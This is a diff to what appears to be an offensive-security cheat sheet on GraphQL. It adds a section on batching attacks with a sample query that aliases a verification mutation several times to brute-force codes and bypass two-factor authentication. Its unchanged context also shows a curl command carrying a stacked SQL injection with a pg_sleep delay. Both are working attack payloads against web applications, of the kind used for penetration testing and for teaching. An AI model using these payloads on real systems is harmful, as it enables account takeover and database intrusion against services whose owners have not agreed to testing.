@@ -16,6 +16,7 @@
   * [Use mutations](#use-mutations)
   * [NOSQL injection](#nosql-injection)
   * [SQL injection](#sql-injection)
+  * [GraphQL Batching Attacks](#graphql-batching-attacks)
 * [References](#references)
 
 ## Tools
@@ -240,6 +241,37 @@ Simple SQL injection inside a graphql field.
 curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
 ```
 
+### GraphQL Batching Attacks
+
+Common scenario:
+* Password Brute-force Amplification Scenario
+* 2FA bypassing
+
+```powershell
+mutation finishChannelVerificationMutation(
+  $input FinishChannelVerificationInput!,
+  $input2 FinishChannelVerificationInput!,
+  $input3 FinishChannelVerificationInput!,
+){
+  first: finishChannelVerificationMutation(input: $input){
+    channel{
+      id
+      option{
+        ... onChannelSmsOptions{
+          number
+        }
+      }
+      status
+      notificationSubscription(last: 1000){ etc...  }
+    }
+  }
+
+
+  second: finishChannelVerificationMutation(input: $input2){...}
+  third: finishChannelVerificationMutation(input: $input3){...}
+}
+```
+
 
 ## References
 
@@ -257,3 +289,4 @@ curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%
 * [HIP19 Writeup - Meet Your Doctor 1,2,3 - June 22, 2019 - Swissky](https://swisskyrepo.github.io/HIP19-MeetYourDoctor/)
 * [Introspection query leaks sensitive graphql system information - @Zuriel](https://hackerone.com/reports/291531)
 * [Graphql Bug to Steal Anyone’s Address - Sept 1, 2019 - Pratik Yadav](https://medium.com/@pratiky054/graphql-bug-to-steal-anyones-address-fc34f0374417)
+* [GraphQL Batching Attack - RENATAWALLARM - DECEMBER 13, 2019](https://lab.wallarm.com/graphql-batching-attack/)
